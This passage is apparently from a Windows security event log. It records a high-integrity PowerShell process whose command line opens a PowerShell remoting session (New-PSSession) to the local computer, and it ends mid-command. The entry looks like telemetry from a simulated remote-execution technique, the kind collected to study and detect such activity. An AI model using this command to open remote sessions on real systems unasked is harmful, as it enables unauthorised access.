	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {New-PSSession -ComputerName $env:COMPUTERNAME
